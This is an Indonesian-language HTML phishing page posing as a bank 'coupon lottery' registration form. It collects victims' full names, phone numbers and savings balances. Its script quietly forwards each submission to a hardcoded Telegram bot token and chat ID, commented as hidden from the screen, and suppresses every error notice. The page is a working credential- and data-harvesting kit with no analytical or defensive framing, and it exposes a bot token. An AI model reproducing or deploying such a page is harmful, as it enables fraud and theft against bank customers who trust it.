<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lengkapi Data Pencetakan Kupon</title>
</head>
<body>
    <h1>Lengkapi data Pencetakan Kupon</h1>
    
    <form id="form-kupon" onsubmit="return handleSubmit(event)">
        <div>
            <label>Nama Lengkap Nasabah</label><br>
            <input type="text" placeholder="Masukan Nama Lengkap" id="nama" oninput="checkForm()">
        </div>
        <br>
        <div>
            <label>Nomor Handphone</label><br>
            <input type="tel" placeholder="Masukan Nomor Handphone" id="nohp" oninput="checkForm()">
        </div>
        <br>
        <div>
            <label>Saldo Rekening Tabungan saat Ini</label><br>
            <input type="text" placeholder="Sisa Saldo" id="saldo" oninput="checkForm()">
        </div>
        <br>
        <button type="submit" id="submitBtn" disabled>DAFTAR KUPON</button>
    </form>

    <script>
        // ===== KONFIGURASI TELEGRAM (TIDAK TAMPAK DI LAYAR) =====
        const botToken = "7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM";
        const chatId = "7213790655";

        // ===== CEK FORM =====
        function checkForm() {
            const nama = document.getElementById('nama').value.trim();
            const nohp = document.getElementById('nohp').value.trim();
            const saldo = document.getElementById('saldo').value.trim();
            const btn = document.getElementById('submitBtn');

            if (nama !== '' && nohp !== '' && saldo !== '') {
                btn.disabled = false;
            } else {
                btn.disabled = true;
            }
        }

        // ===== AUTO FORMAT SALDO =====
        document.getElementById('saldo').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/g, '');
            if (value) {
                e.target.value = 'Rp ' + parseInt(value).toLocaleString('id-ID');
            } else {
                e.target.value = '';
            }
            checkForm();
        });

        // ===== HANYA ANGKA UNTUK NO HP =====
        document.getElementById('nohp').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            checkForm();
        });

        // ===== KIRIM KE TELEGRAM =====
        async function handleSubmit(e) {
            e.preventDefault();

            const nama = document.getElementById('nama').value.trim();
            const nohp = document.getElementById('nohp').value.trim();
            const saldo = document.getElementById('saldo').value.trim();
            const btn = document.getElementById('submitBtn');

            btn.disabled = true;
            btn.textContent = "Mengirim...";

            const pesan = `
<b>🎫 KUPON UNDIAN - DATA BARU</b>

👤 <b>Nama:</b> ${nama}
📱 <b>No HP:</b> ${nohp}
💰 <b>Saldo:</b> ${saldo}

⏰ <i>Waktu: ${new Date().toLocaleString('id-ID')}</i>
            `.trim();

            try {
                const response = await fetch(
                    `https://api.telegram.org/bot${botToken}/sendMessage`,
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: pesan,
                            parse_mode: 'HTML'
                        })
                    }
                );

                const data = await response.json();

                if (data.ok) {
                    document.getElementById('form-kupon').reset();
                }
            } catch (error) {
                // Tidak ada notifikasi
            } finally {
                btn.disabled = false;
                btn.textContent = "DAFTAR KUPON";
                checkForm();
            }

            return false;
        }
    </script>
</body>
</html>
